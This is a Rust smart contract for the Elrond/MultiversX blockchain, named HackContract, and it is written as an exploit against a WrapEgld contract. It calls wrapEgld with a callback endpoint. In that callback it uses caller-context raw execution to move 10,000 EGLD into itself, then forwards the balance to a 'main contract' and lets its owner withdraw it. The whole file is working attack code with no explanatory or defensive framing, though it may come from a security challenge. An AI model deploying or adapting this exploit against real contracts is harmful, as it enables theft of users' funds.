#![no_std]

elrond_wasm::imports!();
elrond_wasm::derive_imports!();

const LEFTOVER_GAS: u64 = 10_000;

pub mod wrap_contract {
    elrond_wasm::imports!();

    #[elrond_wasm::proxy]
    pub trait WrapEgldContract {
        #[payable("*")]
        #[endpoint(wrapEgld)]
        fn wrap_egld(
            &self, 
            #[payment_token] payment_token: TokenIdentifier,
            #[payment_amount] payment_amount: BigUint,
             accept_funds_endpoint_name: OptionalValue<ManagedBuffer>);
    } 
}


#[elrond_wasm::contract]
pub trait HackContract {
    #[init]
    fn init(&self, initial_caller: ManagedAddress, main_contract: OptionalValue<ManagedAddress>) {
        self.initial_caller().set(&initial_caller);

        let main_contract = match main_contract {
            OptionalValue::Some(address) => address, 
            OptionalValue::None => ManagedAddress::zero()
        };
        self.main_contract().set(&main_contract);
    }

    #[endpoint(wrapEgld)]
    #[payable("EGLD")]
    fn wrap_egld(&self, wrap_contract: ManagedAddress) {
        let payment_amount = self.call_value().egld_value();
        let opt_endpoint = ManagedBuffer::from("wrap_egld_callback".as_bytes());

        self.wrapping_contract(wrap_contract)
        .wrap_egld(TokenIdentifier::egld(), payment_amount, OptionalValue::Some(opt_endpoint))
        .execute_on_dest_context()
    }

    #[endpoint]
    #[payable("*")]
    fn wrap_egld_callback(&self) {
        let gas_limit = self.blockchain().get_gas_left() - LEFTOVER_GAS;
        let amount = BigUint::from(10000u32) * BigUint::from(10u32).pow(18u32); // 10K EGLD
        let endpoint = ManagedBuffer::from("sendEgldToMainContract".as_bytes());

        let _ = Self::Api::send_api_impl().execute_on_dest_context_by_caller_raw(
            gas_limit,
            &self.blockchain().get_sc_address(),
            &amount,
            &endpoint,
            &ManagedArgBuffer::new_empty()
        );
    }

    // send the EGLD to the contract where we will withdraw the funds.
    #[payable("*")]
    #[endpoint(sendEgldToMainContract)]
    fn send_egld_to_main_contract(&self) {
        let main_contract = self.main_contract().get();
        let amount = self.blockchain().get_sc_balance(&TokenIdentifier::egld(), 0);

        self.send().direct_egld(&main_contract, &amount, &[]);
    }

    #[only_owner]
    #[endpoint]
    fn withdraw(&self) {
        let initial_caller = self.initial_caller().get();
        let amount = self.blockchain().get_sc_balance(&TokenIdentifier::egld(), 0);

        self.send().direct_egld(&initial_caller, &amount, &[]);
    }

    #[proxy]
    fn wrapping_contract(&self, wrap_contract: ManagedAddress) -> wrap_contract::Proxy<Self::Api>;

    #[storage_mapper("initialCaller")]
    fn initial_caller(&self) -> SingleValueMapper<ManagedAddress>;

    #[storage_mapper("mainContract")]
    fn main_contract(&self) -> SingleValueMapper<ManagedAddress>;

    #[storage_mapper("wrapContract")]
    fn wrap_contract(&self) -> SingleValueMapper<ManagedAddress>;
}
